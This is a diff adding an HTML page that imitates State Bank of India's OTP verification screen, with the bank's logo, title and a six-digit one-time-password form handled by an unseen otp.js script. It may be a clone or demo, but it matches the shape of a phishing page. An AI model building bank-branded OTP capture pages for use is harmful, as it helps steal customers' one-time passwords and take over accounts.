@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBI OTP Verification</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="sbi-login-container">
+        <img src="sbi-logo.png" alt="SBI Logo" class="sbi-logo">
+        <h2 class="sbi-title">State Bank of India - OTP Verification</h2>
+        <form id="otp-form" class="sbi-login-form">
+            <label for="otp">Enter OTP sent to your registered mobile number</label>
+            <input type="text" id="otp" name="otp" maxlength="6" required autocomplete="off" pattern="[0-9]{6}">
+            <button type="submit" class="sbi-login-btn">Verify OTP</button>
+        </form>
+        <div id="otp-feedback"></div>
+        <div class="sbi-login-footer">
+            <a href="#" class="sbi-link">Resend OTP</a>
+        </div>
+    </div>
+    <script src="otp.js"></script>
+</body>
+</html>
